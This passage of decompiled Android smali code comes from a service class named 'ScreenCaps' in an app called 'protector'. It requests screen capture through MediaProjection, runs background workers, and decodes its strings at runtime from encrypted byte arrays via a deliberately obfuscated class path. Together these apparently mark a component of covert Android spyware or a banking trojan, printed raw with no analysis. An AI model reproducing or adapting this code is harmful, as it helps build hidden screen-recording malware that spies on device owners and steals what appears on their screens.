    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->m:Ljava/lang/String;

    invoke-virtual {v0, p0, p1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    invoke-virtual {v0, p0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->n:Ljava/lang/String;

    invoke-virtual {v0, p0, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    return-object v0
.end method

.method public static t(Landroid/content/Context;)Landroid/content/Intent;
    .locals 2

    .line 1
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/icontrol/protector/ScreenCaps;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget-object p0, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    invoke-virtual {v0, p0, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    return-object v0
.end method

.method private static u()I
    .locals 1

    .line 1
    const/16 v0, 0x9

    return v0
.end method

.method private static v(Landroid/content/Intent;)Z
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->m:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->q:Ljava/lang/String;

    invoke-static {p0, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    return p0
.end method

.method private static w(Landroid/content/Intent;)Z
    .locals 2

    .line 1
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->p:Ljava/lang/String;

    invoke-virtual {p0, v0}, Landroid/content/Intent;->hasExtra(Ljava/lang/String;)Z

    move-result v1

    if-eqz v1, :cond_0

    invoke-virtual {p0, v0}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p0

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->r:Ljava/lang/String;

    invoke-static {p0, v0}, Ljava/util/Objects;->equals(Ljava/lang/Object;Ljava/lang/Object;)Z

    move-result p0

    if-eqz p0, :cond_0

    const/4 p0, 0x1

    goto :goto_0

    :cond_0
    const/4 p0, 0x0

    :goto_0
    return p0
.end method

.method public static y(I)V
    .locals 0

    .line 1
    sput p0, Lcom/icontrol/protector/ScreenCaps;->x:I

    return-void
.end method

.method private z(ILandroid/content/Intent;)V
    .locals 3

    .line 1
    const/16 v0, 0x10

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iget-object v2, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    if-nez v2, :cond_0

    invoke-virtual {v0, p1, p2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    if-eqz p1, :cond_0

    invoke-static {}, Landroid/content/res/Resources;->getSystem()Landroid/content/res/Resources;

    move-result-object p1

    invoke-virtual {p1}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object p1

    iget p1, p1, Landroid/util/DisplayMetrics;->densityDpi:I

    iput p1, p0, Lcom/icontrol/protector/ScreenCaps;->g:I

    const/4 p1, 0x6

    new-array p1, p1, [B

    fill-array-data p1, :array_2

    new-array p2, v1, [B

    fill-array-data p2, :array_3

    invoke-static {p1, p2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p0, p1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/view/WindowManager;

    invoke-interface {p1}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object p1

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->e:Landroid/view/Display;

    iget-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->b:Landroid/media/projection/MediaProjection;

    new-instance p2, Lcom/icontrol/protector/ScreenCaps$f;

    const/4 v0, 0x0

    invoke-direct {p2, p0, v0}, Lcom/icontrol/protector/ScreenCaps$f;-><init>(Lcom/icontrol/protector/ScreenCaps;Lcom/icontrol/protector/ScreenCaps$a;)V

    iget-object v0, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    invoke-virtual {p1, p2, v0}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->r()V

    new-instance p1, Lcom/icontrol/protector/ScreenCaps$g;

    invoke-direct {p1, p0, p0}, Lcom/icontrol/protector/ScreenCaps$g;-><init>(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;)V

    iput-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    invoke-virtual {p1}, Landroid/view/OrientationEventListener;->canDetectOrientation()Z

    move-result p1

    if-eqz p1, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/ScreenCaps;->k:Lcom/icontrol/protector/ScreenCaps$g;

    invoke-virtual {p1}, Landroid/view/OrientationEventListener;->enable()V

    :cond_0
    return-void

    :array_0
    .array-data 1
        0x5bt
        0x24t
        -0x23t
        -0x24t
        0x7et
        0x54t
        -0x24t
        -0x22t
        0x59t
        0x2bt
        -0x24t
        -0x2at
        0x6bt
        0x62t
        -0x3dt
        -0x3et
    .end array-data

    :array_1
    .array-data 1
        0x36t
        0x41t
        -0x47t
        -0x4bt
        0x1ft
        0xbt
        -0x54t
        -0x54t
    .end array-data

    :array_2
    .array-data 1
        0x1at
        0x26t
        -0x5et
        -0x32t
        0x4bt
        -0xat
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6dt
        0x4ft
        -0x34t
        -0x56t
        0x24t
        -0x7ft
        0x23t
        -0x75t
    .end array-data
.end method


# virtual methods
.method public b(Landroid/content/Context;)V
    .locals 2

    .line 1
    sget-object v0, Ljava/lang/Boolean;->TRUE:Ljava/lang/Boolean;

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/Boolean;

    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->z:Ljava/util/concurrent/ExecutorService;

    new-instance v1, Lcom/icontrol/protector/ScreenCaps$a;

    invoke-direct {v1, p0, p1}, Lcom/icontrol/protector/ScreenCaps$a;-><init>(Lcom/icontrol/protector/ScreenCaps;Landroid/content/Context;)V

    invoke-interface {v0, v1}, Ljava/util/concurrent/ExecutorService;->submit(Ljava/lang/Runnable;)Ljava/util/concurrent/Future;

    return-void
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()V
    .locals 1

    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->y:Landroid/content/Context;

    new-instance v0, Lcom/icontrol/protector/ScreenCaps$b;

    invoke-direct {v0, p0}, Lcom/icontrol/protector/ScreenCaps$b;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 3

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    sput-object p2, Lcom/icontrol/protector/ScreenCaps;->y:Landroid/content/Context;

    invoke-static {p1}, Lcom/icontrol/protector/ScreenCaps;->v(Landroid/content/Intent;)Z

    move-result p2

    const/4 p3, 0x2

    if-eqz p2, :cond_3

    sget-object p2, Lcom/icontrol/protector/ScreenCaps;->n:Ljava/lang/String;

    const/16 v0, 0x32

    invoke-virtual {p1, p2, v0}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    invoke-static {p2}, Lcom/icontrol/protector/ScreenCaps;->y(I)V

    iget-object p2, p0, Lcom/icontrol/protector/ScreenCaps;->d:Landroid/os/Handler;

    if-nez p2, :cond_0

    new-instance p2, Lcom/icontrol/protector/ScreenCaps$c;

    invoke-direct {p2, p0}, Lcom/icontrol/protector/ScreenCaps$c;-><init>(Lcom/icontrol/protector/ScreenCaps;)V

    invoke-virtual {p2}, Ljava/lang/Thread;->start()V

    :cond_0
    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    new-array v0, p3, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x4

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v1, v1, [B

    fill-array-data v1, :array_3

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {p2, v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/nv;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    sput-object v0, Lcom/icontrol/protector/ScreenCaps;->w:Ljava/lang/String;

    if-nez v0, :cond_1

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->B()V

    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    return p3

    :cond_1
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x1a

    if-lt v0, v1, :cond_2

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-direct {p0, v0}, Lcom/icontrol/protector/ScreenCaps;->A(Landroid/content/Context;)V

    :cond_2
    sget-object v0, Lcom/icontrol/protector/ScreenCaps;->m:Ljava/lang/String;

    const/4 v1, 0x0

    invoke-virtual {p1, v0, v1}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result v0

    sget-object v1, Lcom/icontrol/protector/ScreenCaps;->o:Ljava/lang/String;

    invoke-virtual {p1, v1}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p1

    check-cast p1, Landroid/content/Intent;

    invoke-direct {p0, v0, p1}, Lcom/icontrol/protector/ScreenCaps;->z(ILandroid/content/Intent;)V

    invoke-virtual {p0, p2}, Lcom/icontrol/protector/ScreenCaps;->b(Landroid/content/Context;)V

    goto :goto_0

    :cond_3
    invoke-static {p1}, Lcom/icontrol/protector/ScreenCaps;->w(Landroid/content/Intent;)Z

    move-result p1

    if-eqz p1, :cond_4

    sget-object p1, Ljava/lang/Boolean;->FALSE:Ljava/lang/Boolean;

    sput-object p1, Lcom/icontrol/protector/ScreenCaps;->v:Ljava/lang/Boolean;

    invoke-static {p1}, Lcom/icontrol/protector/a;->d(Ljava/lang/Boolean;)V

    invoke-direct {p0}, Lcom/icontrol/protector/ScreenCaps;->B()V

    :cond_4
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    :goto_0
    return p3

    nop

    :array_0
    .array-data 1
        0x56t
        0x33t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x1ft
        0x77t
        -0x30t
        0x1bt
        -0x65t
        0x21t
        -0x5ct
        -0x18t
    .end array-data

    :array_2
    .array-data 1
        -0x18t
        -0x54t
        0x20t
        -0x60t
    .end array-data

    :array_3
    .array-data 1
        -0x7at
        -0x27t
        0x4ct
        -0x34t
        0x5at
        -0x80t
        -0x4et
        0x33t
    .end array-data
.end method

.method public x()V
    .locals 0

    .line 1
    invoke-virtual {p0}, Landroid/app/Service;->stopSelf()V

    return-void
.end method
